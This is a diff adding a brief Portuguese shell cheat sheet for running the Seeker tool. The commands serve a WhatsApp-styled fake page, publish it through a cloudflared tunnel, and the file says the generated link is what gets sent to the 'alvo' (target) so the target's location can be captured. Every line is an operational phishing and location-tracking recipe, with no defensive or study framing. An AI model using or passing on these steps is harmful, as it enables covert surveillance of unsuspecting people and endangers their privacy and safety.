@@ -1,0 +1,20 @@
+# SEEKER – SÓ LOCALIZAÇÃO (já instalado)
+
+# TERMINAL 1 (abre e deixa rodando)
+cd ~/seeker
+python3 seeker.py <<EOF
+2          # 2 = WhatsApp (muda se quiser)
+           # título → Enter
+           # imagem → Enter
+8080
+EOF
+# ← aqui fica "Waiting for Client..." → NÃO FECHA esse terminal
+
+# TERMINAL 2 (abre uma NOVA aba/terminal e cola isso)
+cd ~/seeker
+./cloudflared tunnel --url http://localhost:8080
+# ← em 5-8 segundos aparece o link https://xxxxx.trycloudflare.com
+# ← esse link é o que você manda pro alvo
+
+# Para parar tudo depois (em qualquer terminal):
+pkill -f seeker.py; pkill cloudflared; pkill php
